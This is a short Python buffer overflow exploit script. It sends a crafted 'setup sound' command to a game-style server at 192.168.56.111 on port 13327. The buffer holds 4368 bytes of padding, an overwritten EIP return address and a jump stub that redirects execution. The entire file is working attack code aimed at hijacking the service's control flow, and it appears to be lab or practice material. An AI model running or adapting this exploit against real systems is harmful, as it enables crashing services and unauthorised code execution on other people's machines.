#!/usr/bin/python3

import socket

host='192.168.56.111'



buffer =b''
buffer +=b'\x11(setup sound ' 
buffer +=b'\x41'*4368 
buffer +=b'\x97\x45\x13\x08' #EIP
buffer +=b'\x83\xc0\x0c\xff\xe0\x90\x90' #ESP
buffer +=b'\x90\x00#'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print('Sending evil buffer...')
s.connect((host, 13327))
data=s.recv(1024)
s.send(buffer)
s.close()
print('Payload Sent')
